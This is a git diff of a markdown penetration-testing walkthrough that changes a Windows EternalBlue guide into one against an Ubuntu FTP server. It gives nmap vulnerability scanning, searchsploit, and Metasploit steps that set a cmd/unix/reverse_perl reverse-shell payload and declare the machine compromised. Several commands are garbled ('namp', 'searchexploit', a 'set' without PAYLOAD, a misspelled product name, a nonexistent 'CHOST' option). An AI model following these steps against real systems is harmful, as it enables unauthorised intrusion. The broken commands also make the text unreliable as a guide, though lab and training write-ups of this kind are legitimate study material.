@@ -22,16 +22,16 @@ After this we have to check which one of the device is tht we are looking for so
 
 ### • 2. Search For Vulnerability : Now we will be searching for the vulnerabilities of the ip we confirmed by doing nmap scans now for vulnerability searching we will be using the following command
 
-    namp -Pn -sV --script vuln -oN vuln-win7-nmap.txt >IP add<
+    namp -Pn -sV --script vuln -oN vuln-ubuntu-nmap.txt >IP add<
 
-As we can see from above report tht there is a vulnerability availabe by the name "ms17-010".
+As we can see from above report tht the version tht is being used is by the name "PRODTPD 1.3.3c".
 
 
-### • 3. Now we would like to get some details on the this Vulnerability, for that we will be using ***"Searchsploit"*** :
+### • 3. Now we would like to search for some exploits taht we can try, for that we will be using ***"Searchsploit"*** to search for exploits :
 
-    searchexploit ms17-010
+    searchexploit PRODTPD 1.3.3c
 
-As we acan see there are 6 exploits for this vulnerability, we will be using the one which can be done (Metasploit) cuz it most efficient and easy to do
+As we acan see there are 2 exploits for this version, and we will be using the one which can be done (Metasploit) cuz it most efficient and easy to do
 
 
 ### • 4. METASPLOIT : The Metasploit Project is a computer security project that provides information about security vulnerabilities and aids in penetration testing and IDS signature development. </br>
@@ -40,10 +40,11 @@ As we acan see there are 6 exploits for this vulnerability, we will be using the
 
     msfconsole
 
-• After getting into msfconsole we have to search for the vulnerability ***"ms17-010"***
+• After getting into msfconsole we have to search for the exploits ***"PRODTPD 1.3.3c"***
 
+     search PRODTPD 1.3.3c 
 
-• Now select the 1st one with the name ***"Eternalblue"*** by using command ***"use 0"***
+• Now select the 1st one with using command ***"use 0"***
 
     use 0
 
@@ -53,6 +54,11 @@ As we acan see there are 6 exploits for this vulnerability, we will be using the
 
     show options
 
+• As we can see there is no LHOST is in this payload instead it is asking for CHOST which we dont know so we will be changing the payload by using the given command
+     
+    show payloads
+    set  cmd/unix/reverse_perl
+    
 now as we can see above we have to fill LPORT, LHOST, RHOSTS & RPORT by using :
 
     set RHOSTS >The Recivers Ip<
@@ -64,4 +70,4 @@ now as we can see above we have to fill LPORT, LHOST, RHOSTS & RPORT by using :
 
      exploit
 
-• Now we have successfully gained the access of the Windows Machine, now we can use ***"help "*** command to get all the details of what can we do in the system
+• Now we have successfully gained the access of the UBUNTU Machine, now we can use ***"help"*** command to get all the details of what can we do in the system
